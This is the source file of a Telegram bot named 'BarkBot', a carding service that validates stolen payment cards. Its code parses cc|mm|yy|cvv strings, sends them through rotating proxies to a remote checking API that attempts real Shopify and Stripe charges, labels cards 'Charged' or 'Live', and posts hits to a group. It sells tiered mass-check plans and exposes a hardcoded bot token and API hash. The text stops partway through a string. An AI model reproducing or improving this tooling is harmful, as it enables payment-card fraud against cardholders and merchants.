# ============================================================
#  BarkBot — FINAL v9.0
#  Proxy System (Old) + Multi-Site Test + Shopify + Stripe
# ============================================================

import asyncio, aiohttp, aiofiles, os, random, time, json, re, string, sys
import requests, uuid, base64, hashlib, logging, urllib.parse
from datetime import datetime, timedelta, timezone
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError
from urllib.parse import urlparse, quote, urlunparse, unquote

# ---------- STRIPE HITTER ----------
try:
    from hitter import AsyncStripeChecker
    HITTER_AVAILABLE = True
except ImportError as _e:
    HITTER_AVAILABLE = False
    print(f"[!] hitter.py not found: {_e}")

# ---------- CONFIG ----------
SHOPI_API_URL = 'http://5.175.222.144:8081/'
API_ID = 36879858
API_HASH = '31edb415db51ac8be94379cdb9bcb236'
BOT_TOKEN = '8853878922:AAGhRXMtw57c5-_lZBrU0w24q1gjCpCn8dM'
ADMIN_IDS = [8978995132]
HIT_GROUP_ID = -1004321624246
AUTO_PIN_CHARGED = True
FORCE_JOIN_CHANNELS = [
    {"id": -1004482899697, "name": "Channel", "url": "https://t.me/+9FlrKCwBZyZjNzQ1"},
    {"id": -1004321624246, "name": "Group",   "url": "https://t.me/+F7H4DU9rU9U2Nzc1"},
]

# ---------- FILES ----------
PREMIUM_FILE = 'premium.txt'
SITES_1_5_FILE = 'sites_1_5.txt'
SITES_10_20_FILE = 'sites_10_20.txt'
KEYS_FILE = 'keys.json'
BANNED_FILE = 'banned.txt'
BOT_STATUS_FILE = 'bot_status.json'
WELCOME_IMAGE_PATH = 'afuona.jpg'
USER_PLANS_FILE = 'user_plans.json'
FEEDBACK_FILE = 'feedback.json'
PROXY_DIR = 'proxies'
os.makedirs(PROXY_DIR, exist_ok=True)

logging.basicConfig(level=logging.WARNING)

bot = None
def is_admin(user_id): return user_id in ADMIN_IDS

# ---------- PLAN SYSTEM ----------
PLAN_LIMITS = {
    "Free":     {"mass": 0,    "single": True,  "proxy": False, "workers": 5},
    "Sed":      {"mass": 50,   "single": True,  "proxy": True,  "workers": 10},
    "Pro":      {"mass": 500,  "single": True,  "proxy": True,  "workers": 20},
    "Bot Op":   {"mass": 5000, "single": True,  "proxy": True,  "workers": 25},
    "TeamMate": {"mass": 5000, "single": True,  "proxy": True,  "workers": 25},
    "Admin":    {"mass": 5000, "single": True,  "proxy": True,  "workers": 25},
    "Owner":    {"mass": 999999,"single": True, "proxy": True,  "workers": 30},
}
VALID_PLANS = list(PLAN_LIMITS.keys())

def load_json_file(fp, default=None):
    if default is None: default = {}
    if not os.path.exists(fp): return default
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return default

def save_json_file(fp, data):
    with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, indent=2)

def get_user_plan(user_id):
    if is_admin(user_id): return "Owner"
    plans = load_json_file(USER_PLANS_FILE, {})
    uid = str(user_id)
    if uid not in plans: return "Free"
    data = plans[uid]
    exp = data.get("expires_at")
    if exp:
        try:
            if datetime.fromisoformat(exp) < datetime.now():
                del plans[uid]; save_json_file(USER_PLANS_FILE, plans); return "Free"
        except: pass
    return data.get("plan", "Free")

def set_user_plan(user_id, plan, days):
    if plan not in VALID_PLANS: return False
    plans = load_json_file(USER_PLANS_FILE, {})
    plans[str(user_id)] = {"plan": plan, "expires_at": (datetime.now() + timedelta(days=days)).isoformat()}
    save_json_file(USER_PLANS_FILE, plans)
    return True

def get_mass_limit(user_id): return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("mass", 0)
def can_use_proxy(user_id): return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("proxy", False)
def get_worker_count(user_id): return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("workers", 5)

# ---------- BOLD ITALIC ----------
_BI_MAP = {
    'a':'𝚊','b':'𝚋','c':'𝚌','d':'𝚍','e':'𝚎','f':'𝚏','g':'𝚐','h':'𝚑','i':'𝚒',
    'j':'𝚓','k':'𝚔','l':'𝚕','m':'𝚖','n':'𝚗','o':'𝚘','p':'𝚙','q':'𝚚','r':'𝚛',
    's':'𝚜','t':'𝚝','u':'𝚞','v':'𝚟','w':'𝚠','x':'𝚡','y':'𝚢','z':'𝚣',
    'A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸',
    'J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁',
    'S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉',
    '0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿',
    '.':'.','_':'_','-':'-',' ':' ',
}
def bold_italic(text):
    if not text: return text
    return ''.join(_BI_MAP.get(ch, ch) for ch in str(text))

# ---------- EMOJI ----------
E = {
    "⚡":"5456140674028019486","💳":"6242055415010429981","💎":"5287547831677112267",
    "🔥":"6129418815341077483","⚠️":"6154263010715111980","❌":"4956337889593000947",
    "✅":"5287547831677112267","💰":"4965219701572503640","👑":"6129792056589031358",
    "🟢":"5287687594207891363","⭐":"6321279450016690374","🤖":"6267155617301037908",
    "🔱":"6267160342767446992","👥":"5870684635282814568","⏳":"5215327832040811010",
    "🛑":"5870498447068502918","📊":"4911241630633165627",
}
def premium_emoji(text):
    if not text: return text
    for e, eid in E.items():
        text = text.replace(e, f'<tg-emoji emoji-id="{eid}">{e}</tg-emoji>')
    return text

active_sessions = {}
pending_price_range = {}
pending_site_range = {}

# ---------- DEAD INDICATORS ----------
_DEAD = ('receipt id is empty','handle is empty','invalid url','cloudflare','connection failed',
    'timed out','access denied','tlsv1 alert','ssl routines','could not resolve','domain name not found',
    'empty reply from server','http error','timeout','unreachable','ssl error','502','503','504',
    'bad gateway','service unavailable','gateway timeout','network error','connection reset',
    'failed to detect product','failed to create checkout','failed to tokenize card','handle error',
    'http 404','url rejected','malformed input','site dead','captcha required','failed','proxy dead',
    'no proxy','checkout error','could not resolve host','failed to connect','connection refused')
def is_dead_site_error(m):
    if not m: return True
    ml = str(m).lower()
    return any(k in ml for k in _DEAD)

def is_real_approved(message):
    if not message: return False
    if is_dead_site_error(message): return False
    rl = str(message).lower()
    kw = ['insufficient','insufficient_funds','cvv','cvc','incorrect_zip','invalid_cvv',
          'incorrect_cvv','invalid cvc','3ds','3d secure','authentication_required','approved']
    return any(k in rl for k in kw)

# ---------- FORCE JOIN ----------
async def is_user_joined(user_id):
    if is_admin(user_id): return True
    if bot is None: return True
    for ch in FORCE_JOIN_CHANNELS:
        try:
            try:
                res = await bot.get_permissions(ch["id"], user_id)
                if res.is_member: continue
                return False
            except Exception: pass
            try:
                await bot(GetParticipantRequest(channel=ch["id"], participant=user_id))
                continue
            except UserNotParticipantError: return False
            except Exception: continue
        except Exception: continue
    return True

def get_force_join_keyboard():
    return [
        [Button.url("📢 Join Channel", FORCE_JOIN_CHANNELS[0]["url"], style="primary"),
         Button.url("👥 Join Group", FORCE_JOIN_CHANNELS[1]["url"], style="primary")],
        [Button.inline("✅ Verify Joined", b"verify_join", style="success")]
    ]

# ---------- HELPERS ----------
def get_bot_status(): return load_json_file(BOT_STATUS_FILE, {'status':'on'}).get('status','on')
def set_bot_status(s): save_json_file(BOT_STATUS_FILE, {'status':s})

def get_file_lines(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp,'r',encoding='utf-8',errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except: return []

def load_banned(): return get_file_lines(BANNED_FILE)
def is_banned(uid): return str(uid) in load_banned()
def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def is_premium(uid): return str(uid) in load_premium_users()
def load_sites_1_5(): return get_file_lines(SITES_1_5_FILE)
def load_sites_10_20(): return get_file_lines(SITES_10_20_FILE)

# ---------- PERSONAL PROXY (OLD SYSTEM) ----------
def get_user_proxy_file(user_id, gate="shopify"):
    return os.path.join(PROXY_DIR, f"{user_id}_{gate}.txt")

def load_user_proxies(user_id, gate="shopify"):
    return get_file_lines(get_user_proxy_file(user_id, gate))

def save_user_proxies(user_id, proxies, gate="shopify"):
    with open(get_user_proxy_file(user_id, gate), 'w', encoding='utf-8') as f:
        for p in proxies: f.write(f"{p}\n")

def get_proxies_for_check(user_id, gate="shopify"):
    p = load_user_proxies(user_id, gate)
    if p: return p
    return load_user_proxies(user_id, "shopify")

def format_proxy_for_requests(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("socks5://", "socks4://")):
        return proxy_str
    if proxy_str.startswith(("http://", "https://")):
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        # Support both ip:port:user:pass AND user:pass:ip:port
        if parts[1].isdigit():
            ip, port, u, pw = parts
        else:
            u, pw, ip, port = parts
        return f"http://{u}:{pw}@{ip}:{port}"
    return f"http://{proxy_str}"

# ⭐ FIXED: Multi-site test (Google, ipify, ip-api, icanhazip)
def test_proxy_connection(proxy_str):
    """Test proxy by trying multiple sites — some proxies block some sites"""
    try:
        proxies = {}
        formatted = format_proxy_for_requests(proxy_str)
        if formatted:
            proxies = {"http": formatted, "https": formatted}

        test_urls = [
            ("https://www.google.com", "google"),
            ("https://api.ipify.org?format=json", "ipify"),
            ("http://ip-api.com/json", "ip-api"),
            ("https://icanhazip.com", "icanhazip"),
        ]
        for url, name in test_urls:
            try:
                r = requests.get(url, proxies=proxies, timeout=12)
                if r.status_code == 200:
                    country, ip = "Unknown", "Unknown"
                    try:
                        if name == "ip-api":
                            d = r.json()
                            country = d.get('country', 'N/A')
                            ip = d.get('query', 'N/A')
                        elif name == "ipify":
                            d = r.json()
                            ip = d.get('ip', 'N/A')
                        elif name == "icanhazip":
                            ip = r.text.strip()
                    except: pass
                    return True, country, ip
            except:
                continue
        return False, None, None
    except: pass
    return False, None, None

def generate_key(n=16):
    return ''.join(random.choices(string.ascii_uppercase+string.digits, k=n))

def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{cv}" for c,m,y,cv in
            re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)]

def mask_user_id(uid):
    s = str(uid)
    if len(s) <= 6: return s
    return s[:3] + "****" + s[-3:]

async def get_bin_info(card_number):
    try:
        bn = card_number[:6]
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{bn}') as r:
                if r.status != 200: return '-','-','-','-','-','-',''
                d = json.loads(await r.text())
                return (d.get('brand','-'),d.get('type','-'),d.get('level','-'),
                        d.get('bank','-'),d.get('country_name','-'),
                        d.get('country_code','-'),d.get('country_flag',''))
    except: return '-','-','-','-','-','-',''

async def get_checker_mention(user_id):
    try:
        ent = await bot.get_entity(user_id)
        u = getattr(ent, "username", None)
        if u: return f'<a href="https://t.me/{u}">{u}</a>'
        f = getattr(ent, "first_name", None)
        if f: return f
    except: pass
    return mask_user_id(user_id)

async def save_user_stats(user_id, success=False):
    f = f"user_{user_id}.json"; d = load_json_file(f, {})
    d['total_checks'] = d.get('total_checks', 0) + 1
    if success: d['successful_checks'] = d.get('successful_checks', 0) + 1
    save_json_file(f, d)

async def create_user_if_not_exists(user_id, username):
    f = f"user_{user_id}.json"
    if not os.path.exists(f):
        save_json_file(f, {'user_id': user_id, 'username': username,
                         'registered_at': datetime.now().isoformat(),
                         'total_checks': 0, 'successful_checks': 0})

# ---------- HIT GROUP ----------
async def send_hit_to_group(user_id, card, message, gateway, hit_type, price="0.0"):
    if not HIT_GROUP_ID or HIT_GROUP_ID == -1001234567890: return
    if hit_type == "Approved" and not is_real_approved(message): return
    try:
        checker_name = await get_checker_mention(user_id)
        if hit_type == "Charged":
            sl = f'𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌁ <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>'
            re_emoji = f' <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>'
        else:
            sl = f'𝗟𝗶𝘃𝗲 𝗖𝗮𝗿𝗱 ⌁ <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji>'
            re_emoji = f' <tg-emoji emoji-id="{E["🟢"]}">🟢</tg-emoji>'
        mb = bold_italic(message[:40] if message else "SUCCESS")
        pb = bold_italic(price); gb = bold_italic(gateway)
        msg = (
            f'[=] {sl}\n─────────────\n'
            f'[=] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⌁ {mb}{re_emoji}\n'
            f'[=] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ ${pb} 𝚄𝚂𝙳 ⌁ <tg-emoji emoji-id="{E["💰"]}">💰</tg-emoji>\n'
            f'[=] 𝗚𝗮𝘁𝗲 ⌁ {gb}\n─────────────\n'
            f'[=] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ {checker_name}'
        )
        await bot.send_message(HIT_GROUP_ID, msg, parse_mode='html', link_preview=False)
    except Exception as e:
        logging.warning(f"Hit group send failed: {e}")

# ---------- CHECK RESULT ----------
async def send_check_result(user_id, card, status, message, gateway, price, elapsed, checker_name):
    try:
        bi = await get_bin_info(card.split('|')[0])
        brand, ctype, level, bank, country, ccode, flag = bi

        if status == "Charged":
            t = f'𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            st = f'𝙲𝚑𝚊𝚛𝚐𝚎𝚍 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        elif status == "Approved":
            t = f'𝗟𝗶𝘃𝗲 𝗖𝗮𝗿𝗱 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            st = f'𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        elif status == "Dead":
            t = f'𝗗𝗲𝗮𝗱 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            st = f'𝙳𝚎𝚊𝚍 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        else:
            t = f'𝗘𝗿𝗿𝗼𝗿 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            st = f'𝙴𝚛𝚛𝚘𝚛 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'

        mb = bold_italic(message[:60] if message else "UNKNOWN")
        bb = bold_italic(brand); cb = bold_italic(ctype); lb = bold_italic(level)
        bkb = bold_italic(bank); cy = bold_italic(country); gw = bold_italic(gateway)
        pb = bold_italic(price); tb = bold_italic(str(round(elapsed,1)))

        msg = (
            f'[⌯] {t}\n─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n'
            f'[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {st}\n'
            f'[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {mb} <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗕𝗜𝗡 ⌁ {bb} · {cb} · {lb}\n'
            f'[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bkb}\n'
            f'[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {flag} {cy} ({ccode})\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ {gw}\n'
            f'[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ ${pb} 𝚄𝚂𝙳 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] 𝗧𝗶𝗺𝗲 ⌁ {tb}𝚜 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ {checker_name}'
        )
        sent = await bot.send_message(user_id, msg, parse_mode='html', link_preview=False)
        if status == "Charged" and AUTO_PIN_CHARGED:
            try: await bot.pin_message(user_id, sent.id, notify=False)
            except: pass
    except Exception as e:
        logging.warning(f"Send result failed: {e}")

# ---------- SHOPIFY ----------
async def check_card(card, site, proxy):
    try:
        if len(card.split('|')) != 4:
            return {'status':'Dead','message':'Bad format','card':card}
        if proxy:
            url = f"{SHOPI_API_URL}?{card}&proxy={proxy}"
        else:
            url = f"{SHOPI_API_URL}?{card}"
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
            async with s.get(url) as r:
                raw = await r.json(content_type=None)
        msg = raw.get('Response',''); price = raw.get('Price','-')
        gate = raw.get('Gate','Shopify Payments')
        charged = str(raw.get('Charged','False')).lower() == 'true'
        approved = str(raw.get('Approved','False')).lower() == 'true'
        rl = str(msg).lower()
        if is_dead_site_error(msg):
            return {'status':'Site Error','message':msg,'card':card,'retry':True,
                    'site':site,'gateway':gate,'price':price,'dead_site':True}
        ck = ['order_placed','order placed','order_completed','payment successful','thank you',
              'charged','success','order_confirmed']
        if charged or any(k in rl for k in ck):
            return {'status':'Charged','message':msg,'card':card,'site':site,'gateway':gate,'price':price}
        ak = ['approved','insufficient','cvv','cvc','incorrect_zip','invalid_cvv','incorrect_cvv',
              '3ds','3d secure','authentication_required']
        if approved or any(k in rl for k in ak):
            return {'status':'Approved','message':msg,'card':card,'site':site,'gateway':gate,'price':price}
        return {'status':'Dead','message':msg,'card':card,'site':site,'gateway':gate,'price':price}
    except asyncio.TimeoutError:
        return {'status':'Site Error','message':'Timeout','card':card,'retry':True,'dead_site':True}
    except Exception as e:
        return {'status':'Dead','message':str(e)[:60],'card':card,'gateway':'Unknown','price':'-'}

async def check_card_with_retry(card, sites, proxies, max_retries=1):
    if not sites: return {'status':'Dead','message':'No sites','card':card,'gateway':'Unknown','price':'-'}
    last = None
    for i in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies) if proxies else None
        r = await check_card(card, site, proxy)
        if not r.get('retry'): return r
        last = r
        if i < max_retries - 1: await asyncio.sleep(0.2)
    return {'status':'Dead','message':'Site errors','card':card,
            'gateway':last.get('gateway','Unknown') if last else 'Unknown',
            'price':last.get('price','-') if last else '-'}

async def test_site(site, proxy):
    try:
        url = f"{SHOPI_API_URL}?5154623245618097|03|2032|156&proxy={proxy}"
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
            async with s.get(url) as r:
                raw = await r.json(content_type=None)
        msg = str(raw.get('Response', '')).lower()
        dk = ['site dead','invalid url','could not resolve','http 404','handle error',
              'failed to detect product','timed out','timeout','unreachable','proxy dead']
        if any(k in msg for k in dk): return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except: return {'site': site, 'status': 'dead'}

# ---------- BOT INIT ----------
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def check_bot_status(event): return get_bot_status() == 'off' and not is_admin(event.sender_id)
async def check_banned(event): return is_banned(event.sender_id) and not is_admin(event.sender_id)

# ---------- KEYBOARDS ----------
def get_main_keyboard():
    return [
        [Button.inline("Checker", b"menu_checker", style="primary"),
         Button.inline("Hitter", b"menu_hitter", style="danger")],
        [Button.inline("Plans", b"menu_plans", style="success"),
         Button.inline("Profile", b"menu_profile", style="primary")],
        [Button.inline("Commands", b"menu_commands", style="primary"),
         Button.inline("Contact", b"menu_contact", style="success")]
    ]

def get_checker_keyboard():
    return [[Button.inline("CHARGE", b"charge_menu", style="primary")],
            [Button.inline("Back", b"main_menu", style="danger")]]

def get_hitter_keyboard():
    return [
        [Button.inline("Stripe Hitter", b"sto_menu", style="primary"),
         Button.inline("Whop Hitter", b"whop_menu", style="danger")],
        [Button.inline("Jio Recharge", b"jio_menu", style="success")],
        [Button.inline("Back", b"main_menu", style="danger")]
    ]

def get_plans_keyboard():
    return [
        [Button.inline("Free", b"plan_info_Free", style="success")],
        [Button.inline("Sed", b"plan_info_Sed", style="primary")],
        [Button.inline("Pro", b"plan_info_Pro", style="primary")],
        [Button.inline("Bot Op", b"plan_info_Bot Op", style="primary")],
        [Button.inline("TeamMate", b"plan_info_TeamMate", style="primary")],
        [Button.inline("Admin", b"plan_info_Admin", style="danger")],
        [Button.inline("Owner", b"plan_info_Owner", style="danger")],
        [Button.inline("Back", b"main_menu", style="danger")]
    ]

def get_back_keyboard(cb=b"main_menu"):
    return [[Button.inline("Back", cb, style="danger")]]

def get_price_range_keyboard(action):
    return [
        [Button.inline("$1 - $5", f"pr_1_5_{action}".encode(), style="success"),
         Button.inline("$10 - $20", f"pr_10_20_{action}".encode(), style="primary")],
        [Button.inline("Cancel", b"main_menu", style="danger")]
    ]

def get_site_range_keyboard():
    return [
        [Button.inline("$1 - $5", b"site_range_1_5", style="success"),
         Button.inline("$10 - $20", b"site_range_10_20", style="primary")],
        [Button.inline("Back", b"adm_panel", style="danger")]
    ]

def get_admin_panel_keyboard():
    return [
        [Button.inline("GenKeys", b"adm_genkeys", style="success"),
         Button.inline("Bot On/Off", b"adm_bot", style="success")],
        [Button.inline("Add Prem", b"adm_addpremium", style="success"),
         Button.inline("Rm Prem", b"adm_rmpremium", style="success")],
        [Button.inline("Ban", b"adm_ban", style="danger"),
         Button.inline("Unban", b"adm_unban", style="danger")],
        [Button.inline("Status", b"adm_status", style="primary"),
         Button.inline("Users", b"adm_users", style="primary")],
        [Button.inline("Prem List", b"adm_premlist", style="primary"),
         Button.inline("Plans", b"adm_plans", style="primary")],
        [Button.inline("Sites", b"adm_sites", style="primary"),
         Button.inline("Broadcast", b"adm_broadcast", style="primary")],
        [Button.inline("Back", b"main_menu", style="danger")]
    ]

# ---------- /start ----------
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    if await check_banned(event):
        await event.reply(premium_emoji("🚫 <b>You are banned.</b>"), parse_mode='html'); return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if not await is_user_joined(uid):
        text = (
            f'[⌯] <b>𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] ⚠️ <b>Join our channel & group to use bot.</b>\n\n'
            f'[⌯] 🔗 <b>Channel</b> ⌁ {FORCE_JOIN_CHANNELS[0]["url"]}\n'
            f'[⌯] 🔗 <b>Group</b> ⌁ {FORCE_JOIN_CHANNELS[1]["url"]}'
        )
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.reply(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_force_join_keyboard(), parse_mode='html')
        else:
            await event.reply(premium_emoji(text), buttons=get_force_join_keyboard(), parse_mode='html')
        return
    try:
        s = await event.get_sender()
        un = s.username if s.username else f"user_{uid}"
    except: un = f"user_{uid}"
    await create_user_if_not_exists(uid, un)
    plan = get_user_plan(uid); ml = get_mass_limit(uid)
    text = (
        f'[⌯] <b>𝗕𝗼𝘁</b> ⌁ <b>BarkBot</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji>\n'
        f'[⌯] <b>𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁</b> ⌁ <b>{"Unlimited" if ml > 100000 else ml}</b>'
    )
    if os.path.exists(WELCOME_IMAGE_PATH):
        await event.reply(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(), parse_mode='html')
    else:
        await event.reply(premium_emoji(text), buttons=get_main_keyboard(), parse_mode='html')

# ---------- /admin ----------
@bot.on(events.NewMessage(pattern='/admin'))
async def admin_command(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Admin Only!"), parse_mode='html'); return
    await event.reply(premium_emoji("<b>👑 ADMIN PANEL</b>"), buttons=get_admin_panel_keyboard(), parse_mode='html')

# ---------- CALLBACKS ----------
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    uid = event.sender_id
    data = event.data.decode('utf-8')
    if await check_banned(event): await event.answer("Banned", alert=True); return
    if await check_bot_status(event) and not data.startswith("adm_"): await event.answer("Bot OFF", alert=True); return

    if data == "stop_mass":
        n = 0
        for k in list(active_sessions.keys()):
            if k.startswith(f"{uid}_"): del active_sessions[k]; n += 1
        await event.answer(f"🛑 Stopped {n}!" if n else "No active!", alert=True)
        try: await event.edit(premium_emoji("🛑 <b>Stopped!</b>"), parse_mode='html')
        except: pass
        return

    if data == "verify_join":
        if await is_user_joined(uid):
            await event.answer("Verified!", alert=True)
            try:
                s = await event.get_sender()
                un = s.username if s.username else f"user_{uid}"
            except: un = f"user_{uid}"
            await create_user_if_not_exists(uid, un)
            plan = get_user_plan(uid); ml = get_mass_limit(uid)
            text = (
                f'[⌯] <b>𝗕𝗼𝘁</b> ⌁ <b>BarkBot</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
                f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji>\n'
                f'[⌯] <b>𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁</b> ⌁ <b>{"Unlimited" if ml > 100000 else ml}</b>'
            )
            try: await event.delete()
            except: pass
            if os.path.exists(WELCOME_IMAGE_PATH):
                await event.respond(premium_emoji(text), file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(), parse_mode='html')
            else:
                await event.respond(premium_emoji(text), buttons=get_main_keyboard(), parse_mode='html')
        else: await event.answer("Join first!", alert=True)
        return

    if data == "main_menu":
        plan = get_user_plan(uid); ml = get_mass_limit(uid)
        text = (
            f'[⌯] <b>𝗕𝗼𝘁</b> ⌁ <b>BarkBot</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["👑"]}">👑</tg-emoji>\n'
            f'[⌯] <b>𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁</b> ⌁ <b>{"Unlimited" if ml > 100000 else ml}</b>'
        )
        try: await event.edit(premium_emoji(text), buttons=get_main_keyboard(), parse_mode='html')
        except: pass
        await event.answer(); return

    if data == "menu_checker":
        await event.edit(premium_emoji("<b>💎 CHECKER</b>\n\n<code>/sh</code> <code>/msh</code>"), buttons=get_checker_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "menu_hitter":
        await event.edit(premium_emoji("<b>🔥 HITTER</b>\n\nSelect below"), buttons=get_hitter_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "charge_menu":
        await event.edit(premium_emoji("<b>💎 CHARGE</b>\n\n<code>/sh cc|mm|yy|cvv</code>\n<code>/msh</code> reply to .txt"), buttons=get_back_keyboard(b"menu_checker"), parse_mode='html')
        await event.answer(); return

    if data == "sto_menu":
        await event.edit(premium_emoji("<b>⚡ Stripe Hitter</b>\n\n<code>/sto URL CC</code>\n<code>/msto URL</code> reply .txt"), buttons=get_back_keyboard(b"menu_hitter"), parse_mode='html')
        await event.answer(); return

    if data == "whop_menu":
        await event.edit(premium_emoji("<b>🔥 Whop Hitter</b>\n\n<code>/whop URL CC</code>"), buttons=get_back_keyboard(b"menu_hitter"), parse_mode='html')
        await event.answer(); return

    if data == "jio_menu":
        await event.edit(premium_emoji("<b>💎 Jio Recharge</b>\n\n<code>/jio number amount cc</code>"), buttons=get_back_keyboard(b"menu_hitter"), parse_mode='html')
        await event.answer(); return

    if data == "menu_plans":
        await event.edit(premium_emoji("<b>👑 PLANS</b>"), buttons=get_plans_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "menu_profile":
        d = load_json_file(f"user_{uid}.json", {})
        plan = get_user_plan(uid); ml = get_mass_limit(uid)
        try:
            s = await event.get_sender()
            un = s.username if s.username else f"user_{uid}"
            fn = s.first_name if s.first_name else "User"
        except: un, fn = f"user_{uid}", "User"
        text = (
            f'[⌯] <b>ID</b> ⌁ <code>{uid}</code>\n'
            f'[⌯] <b>Name</b> ⌁ {fn}\n'
            f'[⌯] <b>Plan</b> ⌁ {plan}\n'
            f'[⌯] <b>Checks</b> ⌁ {d.get("total_checks",0)}\n'
            f'[⌯] <b>Hits</b> ⌁ {d.get("successful_checks",0)}'
        )
        await event.edit(premium_emoji(text), buttons=get_back_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "menu_commands":
        await event.edit(premium_emoji(
            "<b>Commands</b>\n\n"
            "<code>/sh</code> <code>/msh</code> — Shopify\n"
